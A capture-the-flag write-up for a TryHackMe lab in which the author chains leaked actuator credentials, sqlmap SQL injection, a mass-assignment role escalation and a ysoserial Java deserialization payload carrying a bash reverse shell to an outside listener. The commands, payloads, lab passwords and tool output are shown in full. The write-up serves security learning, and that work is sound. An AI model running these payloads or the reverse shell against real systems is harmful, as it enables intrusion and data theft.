## IronHold 


Room Description: The source leaked. Read it like an attacker, chain the flaws, and shell the door-control server.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Ironhold.png)

> IronHold is retiring its inmate-management platform. Somewhere in the handover, a developer pushed the complete repository to a public mirror and then left the company. Facility security wants a straight answer before the system goes dark for good: if that repository is out there, how far could someone actually get?
We start with nothing but what leaked: the full, unredacted source, and a live copy of the application still running on the network. No credentials, no map, no walkthrough. The code tells us what the developers got wrong; the running instance tells us if we're right.
Get all four and Ironhold's last system goes down the same way it went up: on its own mistakes.
Download the source archive attached to this task and start reading. The lab machine is reachable at http://MACHINE_IP:8080.

---

## Objectives

1. What is the flag on the officer dashboard once you're inside the system?
2. What is the flag in the staff record that no page on the site will show you?
3. What is the flag on the warden's door-control panel?
4. What is the flag waiting on the facility server once you're through the gate?

---

## Adding the target to hosts

```shell
sudo echo -e '10.130.134.243 iron.thm' | sudo tee -a /etc/hosts
```

---

## Enumeration & Recon

> Rustscan results:

```
rustscan -a iron.thm --ulimit 5000 -- -sCV -O                              
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open ports, closed hearts.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.130.134.243:22
Open 10.130.134.243:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -O" on ip 10.130.134.243

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 45:10:c1:59:78:66:21:6f:36:24:57:90:b9:e7:01:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCn5H47SNdmyPDCwOEM5coxwTDyfqFlh8xzbCKCwwb6hJJoCdYAnFLY/7nBJ3Gcyfqoljylq32ZVkulOcAagrvU=
|   256 b1:18:85:c9:79:a2:e3:c3:89:e2:7b:f8:a2:66:ee:9a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICurGxxSZvTHMlG2rbJZVZ0Bm8xC8JSLynaztRn4o+Vr
8080/tcp open  http    syn-ack ttl 61 Apache Tomcat (language: en)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Ironhold Correctional | Staff Login

```

> Feroxbuster results

```
feroxbuster -u http://iron.thm:8080/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
                                                                                                                                                                   
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://iron.thm:8080/
 🚩  In-Scope Url          │ iron.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        1l        3w      103c http://iron.thm:8080/login
200      GET       35l       77w     1193c http://iron.thm:8080/status;jsessionid=4927F475950030CA4B65284C6E1DF038
200      GET      226l      405w     3747c http://iron.thm:8080/css/style.css;jsessionid=4927F475950030CA4B65284C6E1DF038
404      GET        1l        2w       93c http://iron.thm:8080/css/
200      GET       38l      132w     1397c http://iron.thm:8080/about;jsessionid=4927F475950030CA4B65284C6E1DF038
200      GET       32l       78w     1201c http://iron.thm:8080/
200      GET      226l      405w     3747c http://iron.thm:8080/css/style.css;jsessionid=09FC773600122C0763EA4A1CD07EF990
200      GET       38l      132w     1397c http://iron.thm:8080/about
404      GET        1l        2w       92c http://iron.thm:8080/css
200      GET      226l      405w     3747c http://iron.thm:8080/css/style.css;jsessionid=713919F811A29A177F4B9B91E4D0F1DE
200      GET       35l       77w     1193c http://iron.thm:8080/status
405      GET        1l        3w      104c http://iron.thm:8080/logout
500      GET        1l        1w       73c http://iron.thm:8080/error
400      GET        1l       32w      435c http://iron.thm:8080/http%3a%2f%2fwww
400      GET        1l       32w      435c http://iron.thm:8080/http%3a%2f%2fyoutube
400      GET        1l       32w      435c http://iron.thm:8080/http%3a%2f%2fblogs
400      GET        1l       32w      435c http://iron.thm:8080/http%3a%2f%2fblog
400      GET        1l       32w      435c http://iron.thm:8080/**http%3a%2f%2fwww
400      GET        1l       32w      435c http://iron.thm:8080/external%5cx-news
404      GET        1l        2w       96c http://iron.thm:8080/web-inf
400      GET        1l       32w      435c http://iron.thm:8080/http%3a%2f%2fcommunity
400      GET        1l       32w      435c http://iron.thm:8080/http%3a%2f%2fradar
400      GET        1l       32w      435c http://iron.thm:8080/http%3a%2f%2fjeremiahgrossman
400      GET        1l       32w      435c http://iron.thm:8080/http%3a%2f%2fweblog
400      GET        1l       32w      435c http://iron.thm:8080/http%3a%2f%2fswik
[####################] - 6m    207641/207641  0s      found:25      errors:0      
[####################] - 6m    207629/207629  587/s   http://iron.thm:8080/     
```

---

## Exposed Endpoints in the source code

```
/
/login
/logout
/about
/status
/css/**
/error
/actuator/**
/admin
/admin/**
/admin/export
/admin/staff
/ironhold-internal:8080/admin/import
/staff
/staff/{id}
/control
/roster
/settings
/settings/diagnostics
/profile
/profile/update
/incidents
/commissary
/comissary/orders
/visitation
/visitation/new
/inmates
/inmates/search
/inmates/{inmate_id}/movements        # Exposed in inmate-detail.html
/notices
```

---

## More Recon and Information Gathering

> During the assessment of the vulnerable website, I came accross this /actuator endpoint, where the directory contents were fully exposed. I found /actuator/env, and started reading the contents. Then I found another exposed credential `kiosk:Sh1ftK10sk#2091` the username and password fully in plaintext. Then, from the source code, I found two other leaked credentials; 1. `ironhold_lookup:Lk_r0_2091!` and 2. `j.reyes,m.chen,a.osei,l.bianchi:IronholdStaff2026!` (4 staff members assigned same password) Let's note these. For source code, and how we found these, look [here](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/SourceCode/README.md)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-29%2016-18-00.png)

> Kiosk Credentials found in `/actuator` endpoint. This endpoint literally leaks its contents unauthenticated. I found the `/env` file with secrets, and system variables. 
![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-29%2020-39-12.png)

> Login page:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-29%2016-46-16.png)


> Let's login with `kiosk` user:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-29%2023-23-16.png)

> After some XSS cookie theft and SSTI attempts, I found this search bar where you can search for inmates. From the source code I found out that this endpoint doesn't sanitize query, which is vulnerable to SQL Injection.

```java
@GetMapping("/inmates/search")
    public String search(@RequestParam(required = false) String q, Model model) {
        List<Map<String, Object>> results;
        if (q == null || q.isBlank()) {
            results = jdbcTemplate.queryForList("SELECT id, name, block FROM inmates");
        } else {
            String sql = "SELECT id, name, block FROM inmates WHERE name = '" + q + "'"; 
            results = jdbcTemplate.queryForList(sql);
        }
        model.addAttribute("results", results);
        model.addAttribute("query", q == null ? "" : q);
        return "inmate-search";
    }
```

> Let's try sqlmap to dump tables for this one:

```shell
sqlmap -u "http://iron.thm:8080/inmates/search?q=test" \
  --dbs \
  --batch --cookie='JSESSIONID=4DE65F6695C9A941B66F94B91F610BA4' --level 5 
        ___
       __H__                                                                                                                                                       
 ___ ___["]_____ ___ ___  {1.10.5#stable}                                                                                                                          
|_ -| . [.]     | .'| . |                                                                                                                                          
|___|_  [(]_|_|_|__,|  _|                                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:21:11 /2026-07-29/
Parameter: q (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: q=test' AND 4972=(SELECT (CASE WHEN (4972=4972) THEN 4972 ELSE (SELECT 7264 UNION SELECT 8098) END))-- XneF

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: q=test' UNION ALL SELECT NULL,CHAR(113)||CHAR(122)||CHAR(98)||CHAR(112)||CHAR(113)||CHAR(84)||CHAR(84)||CHAR(102)||CHAR(99)||CHAR(68)||CHAR(98)||CHAR(117)||CHAR(119)||CHAR(112)||CHAR(105)||CHAR(81)||CHAR(71)||CHAR(78)||CHAR(72)||CHAR(99)||CHAR(98)||CHAR(106)||CHAR(72)||CHAR(82)||CHAR(112)||CHAR(67)||CHAR(114)||CHAR(116)||CHAR(108)||CHAR(67)||CHAR(77)||CHAR(81)||CHAR(109)||CHAR(88)||CHAR(78)||CHAR(71)||CHAR(88)||CHAR(99)||CHAR(77)||CHAR(104)||CHAR(101)||CHAR(68)||CHAR(70)||CHAR(85)||CHAR(67)||CHAR(113)||CHAR(118)||CHAR(118)||CHAR(106)||CHAR(113),NULL-- GWPO
---
[15:21:26] [INFO] testing H2
[15:21:26] [INFO] confirming H2
[15:21:26] [INFO] the back-end DBMS is H2
back-end DBMS: H2
[15:21:27] [INFO] fetching database names
available databases [2]:
[*] INFORMATION_SCHEMA
[*] PUBLIC

[15:21:27] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 53 times

```

> We found 2 databases - public, and information_schema. Let's extract tables, and dump them.

```shell
sqlmap -u "http://iron.thm:8080/inmates/search?q=test" \
  -D PUBLIC \
  --batch --cookie='JSESSIONID=4DE65F6695C9A941B66F94B91F610BA4' --level 5 --tables --dump
        ___
       __H__                                                                                                                                                       
 ___ ___[,]_____ ___ ___  {1.10.5#stable}                                                                                                                          
|_ -| . ["]     | .'| . |                                                                                                                                          
|___|_  [']_|_|_|__,|  _|                                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:52:54 /2026-07-29/

[15:52:54] [INFO] resuming back-end DBMS 'h2' 
[15:52:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: q (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: q=test' AND 4972=(SELECT (CASE WHEN (4972=4972) THEN 4972 ELSE (SELECT 7264 UNION SELECT 8098) END))-- XneF

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: q=test' UNION ALL SELECT NULL,CHAR(113)||CHAR(122)||CHAR(98)||CHAR(112)||CHAR(113)||CHAR(84)||CHAR(84)||CHAR(102)||CHAR(99)||CHAR(68)||CHAR(98)||CHAR(117)||CHAR(119)||CHAR(112)||CHAR(105)||CHAR(81)||CHAR(71)||CHAR(78)||CHAR(72)||CHAR(99)||CHAR(98)||CHAR(106)||CHAR(72)||CHAR(82)||CHAR(112)||CHAR(67)||CHAR(114)||CHAR(116)||CHAR(108)||CHAR(67)||CHAR(77)||CHAR(81)||CHAR(109)||CHAR(88)||CHAR(78)||CHAR(71)||CHAR(88)||CHAR(99)||CHAR(77)||CHAR(104)||CHAR(101)||CHAR(68)||CHAR(70)||CHAR(85)||CHAR(67)||CHAR(113)||CHAR(118)||CHAR(118)||CHAR(106)||CHAR(113),NULL-- GWPO
---
[15:52:54] [INFO] the back-end DBMS is H2
back-end DBMS: H2
[15:52:54] [INFO] fetching tables for database: 'PUBLIC'
Database: PUBLIC
[10 tables]
+-------------------+
| ADMIN_NOTICES     |
| CASE_FILES        |
| COMMISSARY_ORDERS |
| INCIDENT_REPORTS  |
| INMATES           |
| MESSAGES          |
| MOVEMENTS         |
| NOTICES           |
| STAFF             |
| VISITATIONS       |
+-------------------+

[15:52:54] [INFO] fetching columns for table 'ADMIN_NOTICES' in database 'PUBLIC'
[15:52:55] [WARNING] reflective value(s) found and filtering out
[15:52:55] [INFO] fetching entries for table 'ADMIN_NOTICES' in database 'PUBLIC'
[15:52:55] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[15:52:55] [WARNING] the SQL query provided does not return any output
[15:52:55] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[15:52:55] [INFO] fetching number of entries for table 'ADMIN_NOTICES' in database 'PUBLIC'
[15:52:55] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:52:55] [INFO] retrieved: 
[15:52:55] [WARNING] unable to retrieve the number of entries for table 'ADMIN_NOTICES' in database 'PUBLIC'
[15:52:55] [INFO] fetching columns for table 'MOVEMENTS' in database 'PUBLIC'
[15:52:56] [INFO] fetching entries for table 'MOVEMENTS' in database 'PUBLIC'
[15:52:56] [WARNING] the SQL query provided does not return any output
[15:52:56] [INFO] fetching number of entries for table 'MOVEMENTS' in database 'PUBLIC'
[15:52:56] [INFO] retrieved: 
[15:52:56] [WARNING] unable to retrieve the number of entries for table 'MOVEMENTS' in database 'PUBLIC'
[15:52:56] [INFO] fetching columns for table 'INMATES' in database 'PUBLIC'
[15:52:56] [INFO] fetching entries for table 'INMATES' in database 'PUBLIC'
Database: PUBLIC
Table: INMATES
[20 entries]
+----+-------------------+---------+------------------+-------------+-------------+----------------+
| ID | NAME              | BLOCK   | OFFENSE          | STATUS      | CELL_NUMBER | ADMISSION_DATE |
+----+-------------------+---------+------------------+-------------+-------------+----------------+
| 1  | James Marsh       | A-Wing  | Burglary         | ACTIVE      | 100         | 2022-01-01     |
| 2  | Robert Alvarez    | B-Wing  | Fraud            | ACTIVE      | 103         | 2023-02-02     |
| 3  | Michael Nakamura  | C-Wing  | Grand Theft Auto | ACTIVE      | 106         | 2024-03-03     |
| 4  | David Brennan     | D-Wing  | Racketeering     | SEGREGATION | 109         | 2025-04-04     |
| 5  | Marcus Solano     | A-Wing  | Forgery          | TRANSFERRED | 112         | 2022-05-05     |
| 6  | Elena Castillo    | B-Wing  | Extortion        | ACTIVE      | 115         | 2023-06-06     |
| 7  | Sofia Reilly      | C-Wing  | Arson            | ACTIVE      | 118         | 2024-07-07     |
| 8  | Grace Okafor      | D-Wing  | Assault          | ACTIVE      | 121         | 2025-08-08     |
| 9  | Daniel Winslow    | A-Wing  | Burglary         | SEGREGATION | 124         | 2022-09-09     |
| 10 | Victor Fitzgerald | B-Wing  | Fraud            | TRANSFERRED | 127         | 2023-10-10     |
| 11 | Nadia Delgado     | C-Wing  | Grand Theft Auto | ACTIVE      | 130         | 2024-11-11     |
| 12 | Omar Abara        | D-Wing  | Racketeering     | ACTIVE      | 133         | 2025-12-12     |
| 13 | Isabel Whitfield  | A-Wing  | Forgery          | ACTIVE      | 136         | 2022-01-13     |
| 14 | Lucas Doyle       | B-Wing  | Extortion        | SEGREGATION | 139         | 2023-02-14     |
| 15 | Theo Petrov       | C-Wing  | Arson            | TRANSFERRED | 142         | 2024-03-15     |
| 16 | Priya Kowalski    | D-Wing  | Assault          | ACTIVE      | 145         | 2025-04-16     |
| 17 | Hassan Novak      | A-Wing  | Burglary         | ACTIVE      | 148         | 2022-05-17     |
| 18 | Ines Hartley      | B-Wing  | Fraud            | ACTIVE      | 151         | 2023-06-18     |
| 19 | Kenji Vance       | C-Wing  | Grand Theft Auto | SEGREGATION | 154         | 2024-07-19     |
| 20 | Ruth Duarte       | D-Wing  | Racketeering     | TRANSFERRED | 157         | 2025-08-20     |
+----+-------------------+---------+------------------+-------------+-------------+----------------+

[15:52:57] [INFO] table 'PUBLIC.INMATES' dumped to CSV file '/root/.local/share/sqlmap/output/iron.thm/dump/PUBLIC/INMATES.csv'
[15:52:57] [INFO] fetching columns for table 'NOTICES' in database 'PUBLIC'
[15:52:57] [INFO] fetching entries for table 'NOTICES' in database 'PUBLIC'
[15:52:57] [WARNING] the SQL query provided does not return any output
[15:52:57] [INFO] fetching number of entries for table 'NOTICES' in database 'PUBLIC'
[15:52:57] [INFO] retrieved: 
[15:52:57] [WARNING] unable to retrieve the number of entries for table 'NOTICES' in database 'PUBLIC'
[15:52:57] [INFO] fetching columns for table 'CASE_FILES' in database 'PUBLIC'
[15:52:57] [INFO] fetching entries for table 'CASE_FILES' in database 'PUBLIC'
Database: PUBLIC
Table: CASE_FILES
[1 entry]
+----+-------------------------+---------------------------------+----------+----------------------------+-------------+
| ID | TITLE                   | SUMMARY                         | STATUS   | OPENED_AT                  | CASE_NUMBER |
+----+-------------------------+---------------------------------+----------+----------------------------+-------------+
| 1  | Internal Affairs Review | THM{redacted} | OPEN     | 2026-04-29 19:07:15.809349 | IA-2024-007 |
+----+-------------------------+---------------------------------+----------+----------------------------+-------------+
```

> Manual discovery of tables `case_files` and `inmates`:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-30%2000-14-27.png)

---

## Privilege Escalation: Mass  Assignment Vulnerability in Role parameter in `/profile/update` endpoint

> Inside the source code: /Controller/ProfileController.java, there is a logic bug, where aside from `full_name`, `username`, and `badge_number` it also expects `role` parameter, which is not shown in the burp request, and sets it to `current.setRole()` if is blank/null. We can simply add a `role` parameter and set it to `Warden` which is leaked through source code inside `/DataSeeder.java`.

> Burp request:

```burp
fullName=Shift+Kiosk+Account&email=kiosk%40ironhold.example&badgeNumber=K-000&role=WARDEN
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-30%2001-11-33.png)

> Before forged request:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-30%2001-11-52.png)

> After forged request:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-30%2001-12-01.png)

> /admin/control panel after privilege escalation:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-30%2001-12-43.png)


---

## RCE: Java Deserialization

> Now that we can access `/admin/import` and `/admin/export`, and also know that there is a vulnerable dependency to Java Deserialization, we can achieve RCE. In the `/export` endpoint, I saw a serialized output, so we will have to somehow post a serialized RCE payload. I used `ysoserial` for this.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/IronHold/Images/Screenshot%20From%202026-07-30%2001-41-29.png)

```shell
┌──(venv)─(root㉿kali)-[~/venv]
└─# git clone https://github.com/frohoff/ysoserial.git
Cloning into 'ysoserial'...
remote: Enumerating objects: 2306, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 2306 (delta 5), reused 3 (delta 3), pack-reused 2298 (from 2)
Receiving objects: 100% (2306/2306), 463.63 KiB | 1.06 MiB/s, done.
Resolving deltas: 100% (1114/1114), done.


┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
└─# echo '/bin/bash -i >& /dev/tcp/192.168.152.35/4444 0>&1' | base64                                                                                                                                                                   
┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
└─# ls
appveyor.yml  assembly.xml  DISCLAIMER.txt  Dockerfile  LICENSE.txt  payload.b64  payload.bin  pom.xml  README.md  src  ysoserial-all.jar  ysoserial.png
                                                                                                                                                                   
┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
└─#  base64 -w 0 payload.bin > payload.b64

curl -X POST "http://iron.thm:8080/admin/import" \
  -H "Cookie: JSESSIONID=4DE65F6695C9A941B66F94B91F610BA4" \
  -H "Content-Type: text/plain" \
  --data-binary "@payload.b64"
Batch accepted: HashSet                                                                                                                                                                                                                    
┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
└─# echo '/bin/bash -i >& /dev/tcp/192.168.152.35/4444 0>&1' | base64
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTUyLjM1LzQ0NDQgMD4mMQo=
                                                                                                                                                                                                                    
┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
└─# payload=$(java --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections6 \
  "bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTUyLjM1LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" | base64 -w0)
                                                                                                                                                                                                                    
┌──(venv)─(root㉿kali)-[~/venv/ysoserial]
└─# curl -b 'JSESSIONID=4DE65F6695C9A941B66F94B91F610BA4' \     
  -H 'Content-Type: text/plain' \             
  http://iron.thm:8080/admin/import \                                                                                      
  -d $payload
Batch accepted: HashSet
```

> Tab 2: Reverse Shell - penelope

> Looks like we succeeded! The serialized payload was executed successfully.

```bash
┌──(root㉿kali)-[~]
└─# penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 172.16.112.128 • 172.17.0.1 • 192.168.152.35
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => f62a3262ffed 10.130.153.100 Linux-x86_64 👤 appuser(1000) 😍️ Session ID <1>
[-] Cannot deploy agent with remote Python. Select an action below:

  1) Upload https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-x86_64-unknown-linux-musl-install_only_stripped.tar.gz                                         
  2) Upload local Standalone Python binary                                                                                                                                                                          
  3) Specify remote Standalone Python binary path                                                                                                                                                                   
  4) None of the above

                                             
[?] Select action: 1
[•] ⤓ Downloading URL: https://github.com/astral-sh/python-build-standalone/releases/download/20260610/cpython-3.13.14+20260610-x86_64-unknown-linux-musl-install_only_stripped.tar.gz
 ⤷ [########################################] 100% (26.4 MBytes/26.4 MBytes) | 6.0 MBytes/s | Elapsed 0:00:03
[•] ⇥ Uploading to /var/tmp
 ⤷ [########################################] 100% (35.0 MBytes/35.0 MBytes) | 100.0 KBytes/s | Elapsed 0:06:18
[+] Uploaded /var/tmp/cpython-3.13.14+20260610-x86_64-unknown-linux-musl-install_only_stripped.tar.gz

[-] Cannot deploy agent...
[+] Readline support enabled
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /root/.penelope/sessions/f62a3262ffed~10.130.153.100-Linux-x86_64/2026_07_29-18_11_09-538-appuser(1000).log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
appuser@f62a3262ffed:/app$ ls
ls
app.jar
docker-entrypoint.sh
appuser@f62a3262ffed:/app$ 

```

## Local Enumeration & Final Flag

```shell
appuser@f62a3262ffed:/app$ find / -name "*flag*" 2>/dev/null
find / -name "*flag*" 2>/dev/null
/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/opt/ironhold/flag.txt
appuser@f62a3262ffed:/app$ cat /opt/ironhold/flag.txt
cat /opt/ironhold/flag.txt
THM{redacted}
appuser@f62a3262ffed:/app$ 
```


And we finished this CTF!  
